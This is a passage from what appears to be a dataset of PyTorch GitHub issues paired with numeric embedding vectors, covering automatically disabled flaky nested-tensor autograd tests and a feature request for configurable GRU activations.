  8.53260607e-02 -1.03804111e-01  4.88133542e-02  9.86103937e-02
 -2.18419224e-01  3.44033182e-01  3.17742527e-01 -1.38963014e-01
  6.54597580e-03  1.97388053e-01 -2.91233897e-01 -4.82060164e-01
  1.37451261e-01 -1.31944967e-02 -1.70111120e-01 -7.82321244e-02
  5.98322004e-02 -2.96640873e-01 -2.28187405e-02  6.73850775e-02
 -6.18536882e-02  8.01653117e-02 -4.50999886e-02  1.49926692e-01
 -3.44089866e-01  3.36612016e-03 -3.24411660e-01 -1.64370403e-01
 -3.08853358e-01  1.11221448e-02 -2.20612824e-01  2.79269785e-01
 -7.66757801e-02  2.62433086e-02 -6.91395029e-02 -2.60824293e-01
  8.12625289e-02  2.71250606e-02  3.07893693e-01 -2.43059143e-01
 -1.40709907e-01 -7.32630715e-02  1.02502882e-01  5.38029373e-01
 -4.57614064e-01 -5.95814288e-01 -1.44309744e-01  2.06188828e-01
  5.64386658e-02  1.68501988e-01 -2.12782502e-01 -7.85993114e-02
 -1.57214478e-01  6.54904321e-02 -7.01929852e-02 -1.84682786e-01
  2.09777784e-02 -6.16398193e-02  1.04470924e-01  5.61912775e-01
 -1.54998749e-01  4.87123430e-02 -7.33548217e-03 -4.67088213e-03
 -2.15112492e-01  4.55428779e-01 -1.81435809e-01  2.67263263e-01
  2.02894032e-01  3.80845144e-02 -5.14378399e-02  6.15331680e-02
  1.61848262e-01 -1.64061725e-01  3.46342385e-01 -6.33136213e-01
 -1.02567241e-01  1.28840566e-01  2.39124179e-01 -1.85371488e-01
  3.84549558e-01  1.65834442e-01  4.05001417e-02 -2.25586921e-01
  1.17907323e-01  1.69269383e-01 -2.00347230e-01 -1.02954209e-01
  1.52430713e-01 -2.95125157e-01 -7.20347911e-02 -6.01523295e-02
 -3.12368810e-01 -8.32732245e-02 -1.01667717e-01  1.33564144e-01
  9.88387316e-02  4.86804917e-03 -4.16235924e-01 -8.58835131e-03
  3.27908218e-01 -2.63832152e-01  1.00203559e-01 -2.74636269e-01
 -9.74116921e-02 -3.55822891e-02  1.67920291e-01 -2.50541955e-01
 -1.88976564e-02 -8.79298598e-02  1.47706389e-01 -1.16689503e-01
  4.24243212e-01 -2.61672854e-01 -6.22091107e-02  2.11963981e-01
 -8.85070115e-02  1.73912555e-01  1.23053312e-01 -3.64723336e-03
 -1.22612089e-01  2.13822454e-01 -1.54388314e-02  1.78394347e-01
  3.05865526e-01 -1.08813889e-01 -3.43501151e-01  2.42520213e-01
  1.84456229e-01 -2.02821959e-02 -2.86976933e-01 -1.05360858e-02
 -4.27870564e-02  4.34467420e-02 -9.29320976e-02 -9.67896432e-02
 -9.37040001e-02 -1.14134133e-01  8.46456364e-02 -5.45952544e-02
 -8.16457942e-02  5.51185787e-01 -6.35187998e-02 -2.05388084e-01
  2.16157064e-02  4.57654819e-02  8.63757133e-02 -2.62130231e-01
 -1.93687677e-01 -7.20214918e-02  1.40238494e-01  4.66717668e-02
  1.61278009e-01  9.19783041e-02 -2.28038847e-01  1.09446794e-01
 -2.94718206e-01 -2.27529570e-01  7.27319792e-02  4.76883948e-01
  1.95698813e-01  1.42861620e-01  3.54354084e-01  6.01260185e-01
 -1.32531896e-01 -3.15286107e-02 -2.93566227e-01 -2.49480620e-01
  1.61174119e-01 -3.96078005e-02 -6.40026778e-02  2.58120373e-02
  9.05367807e-02  1.98066011e-01 -4.12017703e-01  2.02861011e-01
 -7.14223012e-02  2.02436596e-01  1.60068601e-01 -6.65369816e-03
  2.00776517e-01 -3.66410971e-01 -6.16899282e-02  3.90311591e-02
 -1.84304565e-01  6.57659024e-02 -2.78575905e-02  2.12844580e-01]"
DISABLED test_backward_for_sub_op_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_backward_for_sub_op_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18056138415).

Over the past 3 hours, it has been determined flaky in 9 workflow(s) with 27 failures and 9 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_backward_for_sub_op_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.31003904e-01  6.59972057e-02 -9.80748311e-02  6.21245466e-02
 -9.78652537e-02 -4.00696248e-01 -9.71941184e-03  1.80365324e-01
 -4.65412945e-01 -2.15903610e-01  3.57544303e-01 -6.40754700e-02
  3.20935667e-01  7.64204562e-02 -1.09132975e-01 -3.49570960e-02
 -7.66846538e-02 -5.67484573e-02  4.96381164e-01  1.54451966e-01
 -1.93022937e-01 -3.66464406e-02 -2.89290071e-01  2.86065817e-01
  1.87978715e-01 -3.12570855e-03 -2.37874538e-01  3.87411378e-03
  4.73695658e-02  1.22978255e-01  2.40143001e-01  8.56915563e-02
 -2.88852781e-01 -1.58247743e-02  5.08917272e-01  2.68093050e-01
 -4.00014296e-02 -1.93920597e-01 -2.35416785e-01 -3.77978086e-02
  1.85447365e-01  1.79265104e-02 -1.13507964e-01 -1.13170929e-01
  1.47927597e-01 -7.90956020e-02 -1.60216883e-01  1.78420588e-01
 -2.34473497e-01 -1.72206044e-01  9.45894122e-02 -6.12227023e-02
  1.92146301e-02 -4.46523726e-01  1.21789977e-01 -9.61532965e-02
  1.61124960e-01  5.04685879e-01  1.77041084e-01  2.12738633e-01
  1.20468594e-01  4.69473898e-02 -1.70056820e-01 -2.15350632e-02
 -3.52659076e-03 -5.25971204e-02  2.02141732e-01 -2.19127119e-01
  3.73645723e-01 -2.79244855e-02  1.76273316e-01 -1.21810123e-01
 -3.04925472e-01 -1.42987370e-01  1.18989855e-01  2.05637753e-01
 -3.12918544e-01  1.95471905e-02 -9.83262733e-02 -1.96098626e-01
 -3.24831717e-02  1.03044003e-01 -1.03185207e-01  1.63473517e-01
  2.07664609e-01  1.20734256e-02  1.23909034e-01 -8.67682174e-02
  1.74612433e-01 -2.80947685e-01  1.78523034e-01 -1.98715553e-03
 -1.20465562e-01  3.53765003e-02 -1.56733379e-01 -6.04315698e-02
  2.91253865e-01 -5.17608970e-02 -2.77164817e-01  2.32691631e-01
  1.49594113e-01 -3.56110990e-01 -1.06638446e-01  2.87613660e-01
 -2.56678194e-01 -3.01675975e-01  4.59076822e-01  1.17041588e-01
  3.68040353e-02 -1.42132431e-01  1.27084941e-01  1.22392446e-01
 -8.93381685e-02  9.73561406e-02  7.87680969e-02 -1.11843348e-01
 -1.48212522e-01 -1.55182689e-01 -9.98551678e-03  5.08145034e-01
 -2.10049421e-01 -7.89156705e-02  8.09845328e-02  2.20544189e-02
  2.78897136e-01  1.48390583e-03  8.69190320e-03  1.80004723e-02
  2.46967077e-01  1.94018111e-02  1.04174450e-01  9.32791680e-02
 -2.54801244e-01 -1.05902061e-01  8.60564858e-02  1.51710417e-02
 -2.58876514e-02 -2.07531333e-01  5.24246357e-02  1.46373183e-01
 -1.72315538e-01  1.64446145e-01  1.05594415e-02 -2.58217633e-01
  3.00941885e-01  1.85672194e-04 -7.31064528e-02  1.59998149e-01
  7.10409787e-03  3.48309353e-02  6.75836802e-02 -3.74771245e-02
  2.66548395e-01  3.47449958e-01  2.44253576e-02 -2.04183441e-02
  3.67103666e-01  1.82101429e-01  1.27569258e-01 -3.45492736e-02
 -3.20372581e-02  4.62529182e-01 -1.76621199e-01  1.24972470e-01
  2.49147341e-01 -1.67170703e-01 -4.96911079e-01  2.61881575e-02
 -8.73853639e-02  1.93085909e-01 -7.09521323e-02 -9.92007479e-02
  1.57148182e-01 -7.77400210e-02  1.22067686e-02 -9.53899100e-02
  2.58287787e-01 -3.06115687e-01 -1.38944492e-01  2.17280835e-01
 -1.32670477e-02 -7.61336759e-02  1.89876884e-01  1.12148546e-01
 -3.16584408e-02  2.36362442e-01  2.51246274e-01  1.19514745e-02
 -1.45996939e-02 -1.39104605e-01 -6.13805115e-01 -1.44294351e-01
  1.23083740e-02  8.80722329e-02 -2.54148364e-01 -3.08458745e-01
  1.46560874e-02 -5.77196218e-02 -6.28363863e-02  4.28562574e-02
 -2.99558640e-01  3.69501680e-01  2.51475394e-01 -4.59150448e-02
  5.25221452e-02  1.54188052e-01 -3.03076416e-01 -4.90476906e-01
  6.82592317e-02  1.89499166e-02 -2.22386792e-01 -1.94918644e-02
  9.59235057e-02 -2.23764107e-01 -6.02615438e-02  5.04559502e-02
 -1.51626533e-03  2.59101056e-02 -2.28700787e-02  1.71011955e-01
 -3.79513204e-01 -1.11999452e-01 -3.00697148e-01 -1.10676080e-01
 -3.39305878e-01 -3.42025086e-02 -2.49382913e-01  2.24571913e-01
 -6.03159368e-02 -3.10616791e-02 -1.94783062e-01 -2.91820228e-01
  9.01571438e-02  4.07210514e-02  3.19577336e-01 -2.97333002e-01
 -1.43971533e-01 -5.57386465e-02 -6.31604251e-03  5.66445827e-01
 -5.70048094e-01 -5.46153843e-01 -1.58067361e-01  1.98063374e-01
  8.55194591e-03  2.34005153e-01 -3.93658169e-02 -1.80147797e-01
 -1.32375345e-01  6.52034581e-02 -7.48601928e-02 -2.10357338e-01
  9.01720971e-02 -1.05854034e-01  6.75339252e-02  5.21889746e-01
 -8.42612013e-02  9.70806926e-02  3.70289907e-02  8.22436139e-02
 -2.08726108e-01  4.27653730e-01 -1.04512453e-01  3.70798945e-01
  1.27562225e-01  1.50288209e-01 -1.09795272e-01 -1.00162253e-02
  4.07561772e-02 -1.10076293e-01  3.31345260e-01 -6.18052900e-01
  2.53083427e-02  1.53281391e-01  2.42596313e-01 -2.27301389e-01
  3.71077299e-01  9.09278393e-02 -2.51040589e-02 -2.38062188e-01
  1.10488638e-01  1.89282998e-01 -1.92793265e-01 -9.18411165e-02
  2.09287673e-01 -3.12206089e-01 -5.84154800e-02 -7.32432753e-02
 -2.94637442e-01 -3.84334922e-02 -6.71973825e-02  1.28247812e-01
  1.04968116e-01 -2.94816568e-02 -3.35074246e-01  5.99464774e-03
  3.12170029e-01 -2.79580265e-01  1.65767372e-01 -2.05403402e-01
 -1.79867387e-01 -1.79819968e-02  1.26447409e-01 -2.64610559e-01
  3.98063287e-03  2.91328486e-02  1.40288144e-01 -2.56819446e-02
  3.45670849e-01 -2.59532869e-01  9.67332348e-02  2.96128571e-01
 -9.56438556e-02  1.69310510e-01  6.53130636e-02  2.97044143e-02
 -4.72255424e-02  2.41151452e-01  9.71954316e-04  1.54210314e-01
  3.73298943e-01 -3.30849849e-02 -3.75426412e-01  1.90643579e-01
  1.67079985e-01 -6.91255257e-02 -3.87444854e-01 -9.02976990e-02
 -7.24725239e-03  6.30331784e-02 -6.98109716e-02 -3.84381637e-02
 -9.29354578e-02 -1.75948665e-01  6.04370683e-02 -8.34769532e-02
 -1.36508793e-01  4.65488344e-01 -5.54225966e-02 -1.77117378e-01
  1.27831370e-01  4.09963764e-02  8.73715430e-02 -1.76231503e-01
 -1.39400274e-01  1.76606700e-02  8.10864121e-02  9.72363353e-02
  1.33449540e-01  1.14572018e-01 -8.77574086e-02  4.06678692e-02
 -3.52986932e-01 -1.74711213e-01  1.64723173e-02  4.41946447e-01
  2.22336471e-01  1.08749390e-01  2.68246174e-01  6.23995066e-01
 -2.35236198e-01 -1.14650764e-01 -3.10670257e-01 -2.93800592e-01
  1.33022845e-01 -1.11991823e-01 -1.05422191e-01  6.95140846e-03
  9.79255140e-02  1.40203714e-01 -3.79789531e-01  1.83124423e-01
 -1.13781922e-01  1.51763946e-01  1.72352105e-01 -6.91344514e-02
  1.56378195e-01 -2.89778411e-01 -9.24129188e-02 -6.49195686e-02
 -9.26036239e-02  8.38230923e-02 -1.95541754e-02  2.26372391e-01]"
DISABLED test_backward_for_add_op_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_backward_for_add_op_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18046641341).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_backward_for_add_op_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.18084806e-01  2.81673763e-02 -6.59227222e-02  8.77548456e-02
 -3.26104574e-02 -3.72360766e-01 -5.14882170e-02  1.41387105e-01
 -4.44814563e-01 -1.80489928e-01  3.34786832e-01 -3.67369317e-02
  2.46835828e-01  8.98722038e-02 -3.67668606e-02 -1.71395130e-02
 -1.04172841e-01 -7.48908892e-02  4.68448788e-01  1.14292935e-01
 -1.72911704e-01 -1.89543236e-02 -2.73459017e-01  2.42672399e-01
  1.69531539e-01 -5.46189323e-02 -2.65772402e-01  2.26096082e-02
  6.79874569e-02  1.58220232e-01  2.53404677e-01  1.11794867e-01
 -2.26992041e-01 -5.32193668e-03  4.95723456e-01  2.18241781e-01
 -7.40785450e-02 -1.23407945e-01 -2.84858793e-01 -1.04958557e-01
  1.70233592e-01 -5.60321286e-03 -1.26732886e-01 -8.66043791e-02
  1.26335472e-01 -8.24301913e-02 -1.34254247e-01  2.02545285e-01
 -2.03284234e-01 -1.30824685e-01  8.92823935e-02 -1.05948120e-01
 -1.69503279e-02 -4.82460588e-01  8.60776156e-02 -7.09463730e-02
  1.17726468e-01  5.44128418e-01  1.63189471e-01  2.44511053e-01
  6.75744563e-02  2.00292282e-03 -1.35661453e-01 -1.02402624e-02
 -4.68395688e-02 -4.23989929e-02  1.65854573e-01 -1.29256487e-01
  3.42596710e-01 -8.29326510e-02  1.46177948e-01 -1.07842356e-01
 -2.64263093e-01 -2.06688806e-01  1.45623133e-01  1.75230727e-01
 -3.77968013e-01  4.44957428e-02 -8.24771821e-02 -1.57580107e-01
 -6.37318045e-02  8.16637352e-02 -1.37817979e-01  1.15115196e-01
  2.10413665e-01  5.71594052e-02  1.26582772e-01 -1.39020324e-01
  2.21393257e-01 -2.65166044e-01  2.03658611e-01  2.75840461e-02
 -1.53199762e-01  1.46035440e-02 -7.01934248e-02 -4.21199799e-02
  2.78130293e-01 -1.10633366e-01 -3.36016923e-01  1.77016765e-01
  1.01291232e-01 -4.70189929e-01 -1.02247685e-01  3.11573267e-01
 -2.58880794e-01 -3.44887793e-01  4.04174924e-01  9.95132029e-02
  1.17184361e-02 -1.65109456e-01  1.89927772e-01  1.06953263e-01
 -6.85268715e-02  5.34681343e-02  6.14314824e-02 -5.60904369e-02
 -1.69960633e-01 -2.10205972e-01 -1.94575619e-02  4.84711736e-01
 -2.01467469e-01 -1.24504834e-01  5.10754362e-02  1.72580890e-02
  2.45651722e-01  4.71151387e-03 -3.36859189e-02  5.07717654e-02
  1.83129609e-01  4.96476740e-02  9.63245481e-02  1.27526343e-01
 -1.71286732e-01 -1.23475268e-01  9.79665369e-02 -4.69813030e-03
 -6.15813062e-02 -2.42630035e-01  4.25302535e-02  1.13636784e-01
 -1.39108554e-01  2.23504230e-01  2.85400264e-02 -2.97985196e-01
  3.32273692e-01  4.75492440e-02 -3.20582055e-02  1.91729426e-01
 -2.30184644e-02  4.16223928e-02 -5.91742620e-03  8.33655521e-03
  2.82558143e-01  4.52641875e-01  5.93709946e-02 -2.80029401e-02
  3.21217567e-01  1.73041001e-01  1.16341606e-01 -9.89232957e-02
 -5.11332154e-02  4.54089731e-01 -1.73382103e-01  7.37775788e-02
  2.76009977e-01 -1.61489516e-01 -4.59414810e-01 -1.05223097e-02
 -3.48263308e-02  2.04900533e-01 -1.21943437e-01 -7.90452734e-02
  1.41656622e-01 -7.25478977e-02  5.78573458e-02 -6.16276823e-02
  3.53719383e-01 -3.82442802e-01 -1.62342593e-01  2.29277238e-01
  8.48957375e-02 -3.90707739e-02  1.46255583e-01  1.00972623e-01
 -3.16466987e-02  2.10898787e-01  2.42524385e-01 -5.17466813e-02
  1.91709585e-03 -1.10406213e-01 -6.45962536e-01 -1.05517223e-01
  5.66215850e-02  9.71266255e-02 -2.45930582e-01 -2.75627136e-01
  2.86422521e-02 -6.39638379e-02 -6.17148578e-02  3.47818062e-02
 -2.81999886e-01  4.52279061e-01  2.70343840e-01 -2.10838597e-02
  2.51037702e-02  1.49280727e-01 -3.41530025e-01 -4.60366786e-01
  1.27566606e-01  3.21324915e-02 -2.32638747e-01 -2.89591886e-02
  1.42198384e-01 -2.37618551e-01 -8.16855431e-02  1.24492072e-01
  4.92708758e-04  1.51338689e-02  2.51529552e-02  1.26570851e-01
 -3.26298654e-01 -6.09382987e-02 -2.72655249e-01 -1.40092760e-01
 -3.34830910e-01 -3.27577591e-02 -1.82291836e-01  2.12714896e-01
 -1.32404752e-02 -3.57638076e-02 -1.73326135e-01 -3.07705462e-01
  2.07365975e-01 -6.85913861e-03  3.30068320e-01 -2.76607186e-01
 -1.64824262e-01 -2.50965804e-02  3.56852449e-03  5.52592158e-01
 -6.26477480e-01 -5.23930371e-01 -1.04749374e-01  1.73916429e-01
  3.57792377e-02  1.46254063e-01 -2.07008533e-02 -2.32691750e-01
 -6.76617399e-02  4.21368740e-02 -1.05184719e-01 -2.62771457e-01
  1.14508018e-01 -7.11639076e-02  1.50638856e-02  5.40734887e-01
 -1.12293318e-01  1.94250986e-01  5.70840053e-02  4.95110899e-02
 -1.38303906e-01  4.41546619e-01 -6.01612665e-02  4.00780529e-01
  1.69844538e-01  5.56203909e-02 -1.38908178e-01  3.48990038e-02
 -1.76607892e-02 -1.21861987e-01  3.49281341e-01 -5.80668330e-01
  5.93452044e-02  1.15791723e-01  2.60958433e-01 -1.56778574e-01
  3.75252157e-01  6.40994981e-02 -1.59476288e-02 -2.01490730e-01
  1.74291447e-01  1.28995627e-01 -1.63810849e-01 -9.91144329e-02
  2.01036215e-01 -2.69119978e-01 -6.86193705e-02 -8.45611244e-02
 -2.71883160e-01 -5.75974658e-02 -7.31948018e-02  1.70799136e-01
  7.46085197e-02 -2.08248757e-02 -3.82959276e-01  2.90917754e-02
  2.32460827e-01 -2.99406648e-01  8.80964249e-02 -2.23080531e-01
 -1.60801306e-01 -1.27786547e-02  1.11272320e-01 -2.94520915e-01
 -4.16204557e-02 -3.91855240e-02  1.38967231e-01 -6.57715648e-02
  3.94174993e-01 -2.72107750e-01  1.49776638e-01  4.37396169e-01
 -1.11252517e-01  2.51953393e-01  1.91505495e-02  1.71197820e-02
 -4.10332680e-02  2.51573503e-01 -8.99705738e-02  1.52227551e-01
  3.63921255e-01 -8.71962234e-02 -3.60221088e-01  2.10513726e-01
  2.01247066e-01 -7.50493705e-02 -4.06402647e-01 -1.15283187e-02
 -4.48745638e-02 -1.23544848e-02 -6.41144589e-02 -2.14400478e-02
 -5.55969104e-02 -1.39774531e-01  2.70525366e-03 -9.55132991e-02
 -1.51934385e-01  4.52368110e-01 -1.65361688e-02 -1.87395811e-01
  1.17836431e-01  3.98574397e-02  7.14135915e-02 -2.09058419e-01
 -1.63686574e-01 -1.55561138e-02  7.58339912e-02  1.49029136e-01
  1.54586419e-01  1.84634715e-01 -5.79256713e-02 -1.02897435e-02
 -3.70554447e-01 -1.67867035e-01 -1.98121369e-03  4.34811532e-01
  1.59609169e-01  6.33286536e-02  2.24025041e-01  6.39671445e-01
 -2.60450155e-01 -2.89824978e-02 -2.77624905e-01 -3.08303177e-01
  1.72018647e-01 -1.24145642e-01 -1.10721827e-01 -7.98834041e-02
  9.39269215e-02  1.89397633e-01 -3.99120927e-01  2.40323097e-01
 -1.06993482e-01  1.51604772e-01  1.71817988e-01 -1.25786113e-02
  1.76645964e-01 -2.52597690e-01 -1.88831016e-02  1.24366712e-02
 -1.45669401e-01  7.92738274e-02 -1.78765468e-02  1.99311048e-01]"
Add an option to `torch.nn.GRU` to use other activations than `tanh` ,"### ðŸš€ The feature, motivation and pitch

As of today, `torch.nn.GRU` is  using `tanh`

https://github.com/pytorch/pytorch/blob/main/aten/src/ATen/native/cuda/RNN.cu#L252

Some users request to be able to use other activations like SELU, PRELU, ...

TensorFlow/Keras has an option to choose the activation to use:
https://www.tensorflow.org/api_docs/python/tf/keras/layers/GRU

However, cuDNN GRU is also limited to `tanh` so we will need to fallback to our implementation if user is requesting an alternative activation.

### Alternatives

_No response_

### Additional context

_No response_",False,"[-4.32569206e-01 -2.83307359e-02 -1.48524463e-01 -1.30348355e-02
  2.82547027e-02  6.31801635e-02  2.60723323e-01  3.62239033e-02
 -2.31292307e-01 -1.61372021e-01 -2.42787972e-02 -1.34091869e-01
 -1.26994669e-01 -7.21049234e-02 -6.01453260e-02 -1.39992207e-01
 -1.12251431e-01  3.03508669e-01 -1.68181688e-01 -5.27358234e-01
 -1.26047865e-01 -1.99797913e-01 -4.01688293e-02 -2.02775106e-01
 -8.16311911e-02 -2.24456806e-02  5.05549088e-02  1.00667588e-02
  1.95490316e-01  3.12538818e-04  5.16361669e-02  1.01051539e-01
 -7.88129196e-02  1.26598671e-01 -1.42015472e-01 -4.69505265e-02
 -3.56956720e-01 -1.02654301e-01 -2.06233114e-01 -2.61327088e-01
  6.24029040e-02  5.44449538e-02 -2.24132352e-02  3.60083729e-02
 -3.56356194e-03  1.60200566e-01 -3.09394747e-02 -1.39196441e-01
 -3.33432376e-01 -2.79768467e-01  3.05804461e-01 -6.52030483e-03
 -5.21407872e-02 -1.34689987e-01  1.77774951e-01 -1.21863019e-02
 -1.14726536e-01  2.46178299e-01  2.12137461e-01 -2.81493783e-01
  1.32280320e-01 -1.48733884e-01 -1.37714997e-01  3.84923667e-02
  1.78885870e-02 -2.28845477e-01 -1.96447045e-01  2.05969915e-01
  4.14602160e-01  4.77802604e-02 -1.03819557e-01  1.26644552e-01
  1.58046007e-01 -6.06695563e-03  1.49140418e-01  9.08013433e-02
 -3.56883585e-01  3.03511262e-01 -1.15899667e-01 -2.87750423e-01
  3.84205997e-01  3.56964946e-01  6.17118776e-02 -4.60345894e-02
  2.87303656e-01  2.31097639e-01  1.68614179e-01 -1.45955637e-01
  8.56862292e-02  2.39137709e-01 -5.86492158e-02 -5.56734279e-02
  2.34086752e-01 -1.25279069e-01  4.97303978e-02  6.11819848e-02
  5.80457002e-02 -2.66389579e-01 -3.93196166e-01 -2.38132253e-02
 -2.35785425e-01 -2.81933725e-01 -2.53893286e-01  3.44645798e-01
 -1.59021139e-01 -4.08660889e-01 -6.71229511e-02  4.53029901e-01
 -3.18181850e-02 -3.36817745e-03  3.45154285e-01  1.01629429e-01
 -2.82633901e-01 -1.54216468e-01  1.52165383e-01 -2.24936813e-01
 -2.85600483e-01 -2.33843267e-01  7.89122656e-04  3.17076594e-01
 -9.93945375e-02 -3.27141583e-02 -3.54513526e-03  2.52881378e-01
  9.72393155e-02  1.15992486e-01 -2.06678882e-01  6.52293786e-02
 -8.87968093e-02  4.32143003e-01 -2.32813254e-01 -7.85271972e-02
  4.12050307e-01 -2.43799821e-01  1.84738487e-01  1.77568555e-01
 -1.38417646e-01 -1.63711846e-01 -2.56357938e-01  1.82422876e-01
 -1.04076192e-02  1.97069749e-01  8.69455095e-03 -1.58636659e-01
 -1.04927585e-01  8.08795169e-03  3.53370272e-02 -1.56879932e-01
  2.29036570e-01 -1.77533478e-01 -1.75803095e-01 -2.74245813e-02
 -1.68735296e-01  2.19530076e-01  1.06697999e-01 -8.94844830e-02
 -6.08397424e-02 -8.30724761e-02  2.44752422e-01 -4.87318113e-02
  2.50403017e-01  4.71521169e-02 -7.16414452e-02 -1.24086201e-01
  2.71220863e-01 -2.68446840e-02  1.77169275e-02 -1.98969424e-01
 -2.43668035e-02  1.97111577e-01 -1.37918711e-01 -2.28991687e-01
 -4.48624790e-02  1.73582435e-02  1.13795973e-01 -1.76822901e-01
  1.01712063e-01 -1.48093075e-01 -1.62887976e-01  2.40350664e-01
  2.31923372e-01  8.23285878e-02  3.87905657e-01  1.54544832e-02
 -1.29209116e-01  2.16294587e-01  4.40420806e-01  1.92390829e-02
 -2.88433731e-01  1.45004585e-01 -4.06382233e-01  2.21592054e-01
 -1.14885665e-01 -3.86043638e-02 -1.15155458e-01  1.64796151e-02
 -1.55182421e-01 -1.54112503e-01 -5.12955070e-01 -1.22265227e-01
 -1.39527172e-01 -6.76375031e-02 -1.87192291e-01 -1.78022206e-01
  7.27484599e-02  6.72834069e-02 -5.89428484e-01 -9.53403562e-02
 -8.11026525e-03 -5.29871434e-02 -1.21697798e-01 -7.98989236e-02
  2.55969930e-02  4.20981348e-02  4.27237116e-02 -6.19282573e-02
 -3.52991931e-03  1.14008918e-01 -9.78619754e-02  1.73805714e-01
  2.98093259e-01 -4.91309948e-02  7.32487114e-03 -1.18648969e-01
  2.29007751e-01 -3.88440192e-02 -2.44986504e-01  8.24965313e-02
  2.71162093e-01  1.72627702e-01 -1.09751811e-02 -4.65410411e-01
  6.91254735e-02 -2.87804008e-02  2.56685317e-01  1.48982406e-01
 -2.15405431e-02  6.03011660e-02 -9.54086035e-02  3.86400372e-02
 -4.60374504e-01  2.79235542e-01  1.06261559e-01  3.22909281e-02
 -1.84207290e-01  1.84134319e-01 -3.18199456e-01  5.46217673e-02
 -9.09235403e-02 -9.86715257e-02  2.31631368e-01  1.47542894e-01
 -1.37999386e-01  1.68032348e-01  1.45609438e-01  2.83777229e-02
 -2.75998652e-01  5.20162284e-02  6.27495721e-02 -1.38285190e-01
  2.57076740e-01  4.92773473e-01 -2.36245632e-01  2.71116257e-01
  4.01266038e-01  3.62438709e-02 -2.09195197e-01  3.97057891e-01
 -2.59400487e-01  6.00039698e-02 -1.31532457e-02 -2.84449011e-01
 -1.01511985e-01  1.02431521e-01  1.95480883e-01 -3.03251565e-01
  1.45130903e-01 -1.93793654e-01  3.78943980e-02 -2.25078426e-02
  3.94479871e-01 -1.06874563e-01 -2.21253745e-02  1.45938396e-01
  3.41122508e-01 -3.47807139e-01 -7.65382722e-02 -3.37941736e-01
 -9.88245234e-02 -3.57424498e-01 -2.72322804e-01  3.76487792e-01
  1.27810121e-01 -7.93549865e-02 -2.51965642e-01 -1.22474685e-01
  3.41877788e-01  5.09910546e-02 -1.82276011e-01 -3.04711461e-01
  3.41940112e-02  1.01325274e-01  1.93747163e-01 -3.26182723e-01
 -3.67339969e-01 -6.95085675e-02 -8.80672187e-02 -8.34674612e-02
  7.84517765e-01  5.89771718e-02  1.48548454e-01  5.38404584e-01
  2.41069287e-01  2.18479216e-01 -3.76590878e-01  1.10499255e-01
  3.46650854e-02  8.05103332e-02 -1.37231220e-02  1.59522906e-01
  7.23971128e-02 -1.89688668e-01 -1.73459604e-01  1.68916181e-01
 -5.54754324e-02  2.20342264e-01 -3.22401941e-01  2.95005869e-02
 -8.16705525e-02 -5.78270629e-02  2.64579803e-01 -5.17574772e-02
  2.88805097e-01  2.06327274e-01  9.96226445e-02  2.12696254e-01
  8.68776143e-02  3.72838080e-01  1.15227491e-01 -1.60688460e-01
 -4.22245383e-01  3.29055749e-02  5.28650433e-02  3.08641754e-02
 -1.09095603e-01 -1.44128293e-01  1.54084504e-01  1.92859620e-01
 -1.31895822e-02  1.84274212e-01 -2.49023005e-01  1.30120933e-01
 -9.52487811e-03  2.38715798e-01  3.54516804e-01  5.09144843e-01
 -1.64440855e-01 -1.21462815e-01  6.61901683e-02 -2.77449805e-02
 -2.73710877e-01 -1.55401472e-02  6.38268590e-02 -4.26564179e-02
 -2.54320681e-01  1.74910903e-01  1.82756364e-01 -4.02675688e-01
 -2.35882308e-03  4.37662572e-01 -1.46576241e-01 -5.32308407e-02
  4.37371507e-02  1.91760778e-01  3.14363331e-01  8.70827958e-02
  2.79339314e-01 -1.13834590e-01  1.91118836e-01  1.28396973e-01
  1.38232425e-01  1.25691444e-01 -2.90006757e-01 -3.55728753e-02]"
DISABLED test_backward_add_strided_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_backward_add_strided_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18024258928).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_backward_add_strided_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

